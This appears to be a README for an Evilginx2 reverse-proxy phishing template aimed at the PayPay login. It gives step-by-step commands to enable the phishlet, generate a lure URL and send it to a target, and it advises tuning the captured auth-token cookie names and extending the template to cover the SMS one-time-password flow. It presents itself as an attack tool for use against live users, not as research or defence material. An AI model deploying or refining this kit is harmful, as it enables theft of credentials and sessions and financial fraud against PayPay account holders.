# PayPay Evilginx2 Phishlet

## Usage

1. Place this `paypay.yaml` into your Evilginx2 `phishlets/` directory.
2. Configure hostname:
   ```
   phishlets hostname paypay your-domain.com
   phishlets enable paypay
   ```
3. Create a lure:
   ```
   lures create paypay
   lures get-url 0
   ```
4. Send the generated URL to the target. The address bar will show a domain under your control that proxies the real PayPay site.

## Notes

- Password managers will autofill because the victim sees a domain that matches the original (via the proxy).
- OTP (SMS) flow is not fully covered yet. You will likely need to extend the phishlet after capturing real traffic.
- Adjust `auth_tokens` cookie names after analyzing actual login sessions.
- CDN and static hosts are included so the page loads correctly.

This is a starting template. Test and refine against the live PayPay login flow.
